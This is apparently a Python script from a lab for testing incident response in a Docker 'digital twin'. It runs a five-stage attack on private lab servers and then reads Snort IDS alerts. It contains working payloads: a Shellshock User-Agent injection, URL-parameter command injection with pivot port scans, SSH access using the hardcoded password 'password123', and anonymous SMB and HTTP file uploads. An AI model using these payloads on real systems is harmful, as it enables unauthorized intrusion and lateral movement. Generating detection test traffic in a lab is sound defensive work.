"""
Execute a diverse five-server attack scenario in the digital twin.

This scenario runs from the client container (10.0.1.11) and targets:
- server_ssh at 10.0.2.11
- server_samba at 10.0.2.12
- server_shellshock at 10.0.2.13
- server_web1 at 10.0.2.14
- server_web2 at 10.0.2.15

The stages intentionally differ from run_attack.py and
run_attack_four_servers_diverse.py:
- server_ssh: credential reuse with SSH file transfer and command proof.
- server_samba: multi-file staging, rename, and read-back over SMB.
- server_shellshock: CGI command execution plus server-side network probing.
- server_web1: web-accessible HTML upload marker.
- server_web2: command-injection RCE with a real pivot from 10.0.2.15.
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"

SERVER_SSH = "10.0.2.11"
SERVER_SAMBA = "10.0.2.12"
SERVER_SHELLSHOCK = "10.0.2.13"
SERVER_WEB1 = "10.0.2.14"
SERVER_WEB2 = "10.0.2.15"


def run(command: str) -> str:
    """Execute a command in the client container and log the result."""
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the five-server attack and print resulting Snort alerts."""
    logger.info("=== Stage 1: Service-specific TCP and HTTP fingerprinting ===")
    run(
        "for spec in "
        f"{SERVER_SSH}:22 {SERVER_SAMBA}:445 {SERVER_SHELLSHOCK}:80 "
        f"{SERVER_WEB1}:8080 {SERVER_WEB2}:8081; do "
        "host=${spec%:*}; port=${spec#*:}; "
        "echo tcp_probe=${host}:${port}; "
        "timeout 2 bash -c \"</dev/tcp/${host}/${port}\" "
        "&& echo open=${host}:${port} || echo closed=${host}:${port}; "
        "done"
    )
    run(
        "curl -s -I "
        f"http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable "
        f"http://{SERVER_WEB1}/ "
        f"http://{SERVER_WEB2}/ "
        "2>&1 || true"
    )

    logger.info("=== Stage 2: SSH credential reuse and file transfer on server_ssh ===")
    run(
        "printf 'ssh five-server credential reuse marker from client\\n' "
        "> /tmp/local_ssh_reuse_5server.txt"
    )
    run(
        "sshpass -p password123 scp "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null "
        "-o ConnectTimeout=4 "
        "/tmp/local_ssh_reuse_5server.txt "
        f"admin@{SERVER_SSH}:/tmp/observed_ssh_reuse_5server.txt "
        "2>&1 || true"
    )
    run(
        "sshpass -p password123 ssh "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null "
        "-o ConnectTimeout=4 "
        f"admin@{SERVER_SSH} "
        "'whoami; id; hostname; "
        "ls -l /tmp/observed_ssh_reuse_5server.txt; "
        "cat /tmp/observed_ssh_reuse_5server.txt' "
        "2>&1 || true"
    )

    logger.info("=== Stage 3: SMB multi-file staging and rename on server_samba ===")
    run("printf 'samba five-server marker alpha\\n' > /tmp/samba_5server_alpha.txt")
    run("printf 'samba five-server marker beta\\n' > /tmp/samba_5server_beta.txt")
    run(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'mkdir observed_dir_5server; "
        "cd observed_dir_5server; "
        "put /tmp/samba_5server_alpha.txt alpha.txt; "
        "put /tmp/samba_5server_beta.txt beta.tmp; "
        "rename beta.tmp beta_renamed.txt; "
        "ls' "
        "2>&1 || true"
    )
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'cd observed_dir_5server; "
        "get beta_renamed.txt /tmp/samba_5server_readback.txt' "
        "2>&1 || true"
    )
    run("cat /tmp/samba_5server_readback.txt 2>/dev/null || true")

    logger.info("=== Stage 4: Shellshock server-side execution and network probe ===")
    run(
        "curl -s "
        f"'http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable' "
        "-H 'User-Agent: () { :;}; echo; "
        "/bin/bash -lc \"whoami; id; hostname; "
        "echo shellshock five-server marker from client "
        "> /tmp/observed_shellshock_5server.txt; "
        "cat /tmp/observed_shellshock_5server.txt; "
        "for spec in 10.0.2.11:22 10.0.2.12:445 10.0.2.15:8081; do "
        "host=\\${spec%:*}; port=\\${spec#*:}; "
        "echo shellshock_probe=\\${host}:\\${port}; "
        "timeout 2 bash -c \\\"</dev/tcp/\\${host}/\\${port}\\\" "
        "&& echo open=\\${host}:\\${port} || echo closed=\\${host}:\\${port}; "
        "done\"' "
        "2>&1 || true"
    )

    logger.info("=== Stage 5: Web-accessible HTML upload on server_web1 ===")
    run(
        "printf '<html><body>web1 five-server upload marker</body></html>\\n' "
        "> /tmp/observed_web1_5server.html"
    )
    run(
        "curl -s -o /tmp/web1_5server_upload_response.txt "
        "-w 'upload_status=%{http_code}\\n' "
        "--data-binary @/tmp/observed_web1_5server.html "
        f"'http://{SERVER_WEB1}:8080/upload?name=observed_web1_5server.html'"
    )
    run("cat /tmp/web1_5server_upload_response.txt 2>/dev/null || true")
    run(
        "curl -s -w '\\nfetch_status=%{http_code}\\n' "
        f"http://{SERVER_WEB1}/uploads/observed_web1_5server.html"
    )

    logger.info("=== Stage 6: Web command injection and pivot from server_web2 ===")
    run(
        "curl -s --get "
        "--data-urlencode "
        "\"target=127.0.0.1; pwd; whoami; id; hostname; "
        "echo web2 command injection five-server marker from client "
        "> /tmp/observed_web2_diag_5server.txt; "
        "cat /tmp/observed_web2_diag_5server.txt; "
        "for spec in 10.0.2.11:22 10.0.2.12:445 10.0.2.13:80 10.0.2.14:8080; do "
        "host=\\${spec%:*}; port=\\${spec#*:}; "
        "echo web2_pivot_probe=\\${host}:\\${port}; "
        "timeout 2 bash -c \\\"</dev/tcp/\\${host}/\\${port}\\\" "
        "&& echo open=\\${host}:\\${port} || echo closed=\\${host}:\\${port}; "
        "done\" "
        f"http://{SERVER_WEB2}:8081/diag "
        "2>&1 || true"
    )

    logger.info("=== Five-server attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
